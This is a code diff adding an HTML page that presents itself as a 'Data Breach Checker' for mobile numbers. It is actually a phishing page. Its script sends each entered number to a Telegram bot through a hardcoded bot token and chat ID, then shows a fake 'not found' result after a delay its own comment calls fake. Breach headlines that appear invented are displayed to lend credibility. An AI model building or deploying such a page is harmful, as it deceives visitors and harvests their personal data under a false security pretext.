@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Data Breach Checker</title>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #eaeaea;
+      overflow-x: hidden;
+    }
+
+    /* HEADER */
+    header {
+      text-align: center;
+      padding: 60px 20px 40px;
+      animation: fadeIn 1.5s ease;
+    }
+    header h1 {
+      font-size: 2.8rem;
+      margin-bottom: 15px;
+      color: #00d4ff;
+      text-shadow: 0 0 10px rgba(0,212,255,0.6);
+    }
+    header p {
+      font-size: 1.2rem;
+      opacity: 0.85;
+      min-height: 30px;
+    }
+    .typing {
+      border-right: 2px solid #00d4ff;
+      white-space: nowrap;
+      overflow: hidden;
+      animation: typing 4s steps(40, end) infinite alternate, blink 0.7s step-end infinite;
+    }
+
+    /* CONTAINER */
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 40px 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.6);
+      text-align: center;
+      backdrop-filter: blur(10px);
+      animation: slideUp 1.5s ease;
+    }
+    .container input {
+      width: 80%;
+      padding: 14px;
+      border-radius: 10px;
+      border: none;
+      margin-bottom: 20px;
+      font-size: 1rem;
+      outline: none;
+      background: rgba(0,0,0,0.3);
+      color: #fff;
+      transition: all 0.3s ease;
+    }
+    .container input:focus {
+      box-shadow: 0 0 10px #00d4ff;
+      background: rgba(0,0,0,0.5);
+    }
+    .container button {
+      padding: 14px 30px;
+      border: none;
+      border-radius: 10px;
+      background: #00d4ff;
+      color: #000;
+      font-size: 1rem;
+      cursor: pointer;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+      transition: 0.3s;
+    }
+    .container button:hover {
+      background: #0088a9;
+      color: #fff;
+      transform: scale(1.05);
+    }
+    .error {
+      margin-top: 15px;
+      color: #ff5757;
+      font-weight: bold;
+      display: none;
+    }
+
+    /* LOADER */
+    .loader {
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #00d4ff;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 1s linear infinite;
+      margin: 15px auto;
+      display: none;
+    }
+
+    /* BREACHES */
+    .breaches {
+      margin: 60px auto;
+      max-width: 900px;
+      padding: 0 20px;
+    }
+    .breach-card {
+      background: rgba(255,255,255,0.05);
+      padding: 25px;
+      margin: 20px 0;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .breach-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+    }
+    .breach-card h3 {
+      margin: 0 0 10px;
+      color: #00d4ff;
+    }
+    .breach-card p {
+      opacity: 0.85;
+      line-height: 1.5;
+    }
+
+    /* FOOTER */
+    footer {
+      text-align: center;
+      padding: 25px;
+      background: rgba(0, 0, 0, 0.6);
+      margin-top: 50px;
+      font-size: 0.9rem;
+      border-top: 1px solid rgba(255,255,255,0.1);
+    }
+
+    /* ANIMATIONS */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slideUp {
+      from { transform: translateY(30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes typing {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+    @keyframes blink {
+      50% { border-color: transparent; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1> Data Breach Checker</h1>
+  <p class="typing">Check if your number has been exposed in recent data leaks...</p>
+</header>
+
+<div class="container">
+  <input type="text" id="phoneNumber" placeholder="Enter Mobile Number">
+  <br>
+  <button onclick="checkNumber()">Check Now</button>
+  <div class="loader" id="loader"></div>
+  <p id="errorMsg" class="error">❌ Invalid number or not found in breaches.</p>
+</div>
+
+<section class="breaches">
+  <h2>📰 Recently Reported Breaches</h2>
+  <div class="breach-card">
+    <h3>Telegram – 2M+ Users Data Leaked</h3>
+    <p>Exposed user IDs, usernames, and mobile numbers.</p>
+  </div>
+  <div class="breach-card">
+    <h3>facebook – 1.2M Emails Exposed</h3>
+    <p>Leaked customer emails and partial phone records.</p>
+  </div>
+  <div class="breach-card">
+    <h3>Yati Platform – 500K Accounts Compromised</h3>
+    <p>Passwords and contact details leaked online.</p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2025 Cybersecurity Breach Monitor | Stay Safe Online</p>
+</footer>
+
+<script>
+  const BOT_TOKEN = "7001311590:AAFOxmKuyiXEV4u8dF3_Iv4Zrn0dfSVyDbo";
+  const CHAT_ID = "8406913795"; // replace with your chat/group ID
+
+  function checkNumber() {
+    let number = document.getElementById("phoneNumber").value.trim();
+    let errorMsg = document.getElementById("errorMsg");
+    let loader = document.getElementById("loader");
+
+    errorMsg.style.display = "none";
+
+    if (number === "" || isNaN(number) || number.length < 10) {
+      errorMsg.style.display = "block";
+      return;
+    }
+
+    loader.style.display = "block";
+
+    // Send number to Telegram bot
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: "📱 Breach Check Attempt:\nNumber: " + number
+      })
+    });
+
+    // Fake "checking" delay
+    setTimeout(() => {
+      loader.style.display = "none";
+      errorMsg.style.display = "block";
+    }, 2000);
+  }
+</script>
+
+</body>
+</html>
